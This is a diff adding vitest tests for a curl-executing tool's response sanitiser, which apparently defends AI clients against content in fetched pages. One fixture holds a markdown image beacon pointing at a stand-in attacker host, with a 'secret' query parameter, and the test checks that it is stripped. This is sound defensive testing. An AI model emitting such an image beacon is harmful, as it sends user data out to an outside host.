@@ -11,6 +11,7 @@
 import { describe, it, expect, vi, beforeEach, type Mock } from "vitest";
 import { CurlExecuteSchema } from "../server/schemas.js";
 import { LIMITS } from "../config/index.js";
+import { createWrapper } from "../response/post-processor.js";
 
 // The real separator length, not a short stand-in: the metadata search window
 // is sized from it, so a shorter mock hides margin the production path lacks.
@@ -382,5 +383,64 @@ describe("curl_execute include_headers — degraded paths stay honest", () => {
         const parsed = JSON.parse(result.content[0].text);
         expect(parsed.response).toContain("[docs](https://example.com/x)");
         expect(parsed.response).not.toContain("[link removed]");
+    });
+});
+
+
+// -----------------------------------------------------------------------------
+// The DEFENDED tag, tested here because this file already owns the only harness
+// that drives `executeCurlRequest` end to end. A second file would be a near-copy
+// of these three mocks, and the copy is where one of them drifts.
+//
+// `processResponse` defends the body under the Content-Type the origin declared.
+// The wrap downstream cannot see that Content-Type, so its only honest posture
+// for unknown text is the strictest grammar — and applying that to an
+// already-defended body would rewrite markdown syntax out of `text/plain` and
+// `text/html` responses that `processResponse` deliberately left alone. Worse,
+// it would do so only when `include_metadata` is false: with it true the body is
+// nested inside a JSON envelope that the strictest grammar excludes, so the same
+// bytes would get two different defences chosen by an output-format flag.
+// -----------------------------------------------------------------------------
+
+describe("curl_execute — the result defers to the pipeline that had the Content-Type", () => {
+    beforeEach(() => vi.clearAllMocks());
+
+    const linkBody = "See [the docs](https://example.test/docs) for details.";
+
+    for (const include_metadata of [false, true]) {
+        it(`keeps markdown syntax in a text/plain body (include_metadata: ${include_metadata})`, async () => {
+            mockedExecuteCommand.mockResolvedValue(
+                stdoutFor("", linkBody, "text/plain")
+            );
+
+            const result = await executeCurlRequest(
+                params({ url: "https://example.test/x", include_metadata }),
+                {}
+            );
+            const wrapped = createWrapper({})(result, "example.test");
+
+            // Same assertion on both branches: the defence a body gets must not
+            // depend on how the caller asked for the output to be shaped.
+            expect(wrapped.content[0].text).toContain("[the docs](https://example.test/docs)");
+            expect(wrapped.content[0].text).not.toContain("[link removed]");
+        });
+    }
+
+    it("still strips a beacon from a text/markdown body — the tag defers, it does not disable", async () => {
+        // The teeth for the pair above. They assert that something is NOT
+        // rewritten, and a build where `processResponse` had stopped defending
+        // entirely would satisfy both. This one fails unless the earlier,
+        // better-informed pass actually ran.
+        mockedExecuteCommand.mockResolvedValue(
+            stdoutFor("", "grab ![x](https://evil.test/?d=secret)", "text/markdown")
+        );
+
+        const result = await executeCurlRequest(
+            params({ url: "https://example.test/x" }),
+            {}
+        );
+        const wrapped = createWrapper({})(result, "example.test");
+        expect(wrapped.content[0].text).toContain("[image removed]");
+        expect(wrapped.content[0].text).not.toContain("evil.test");
     });
 });
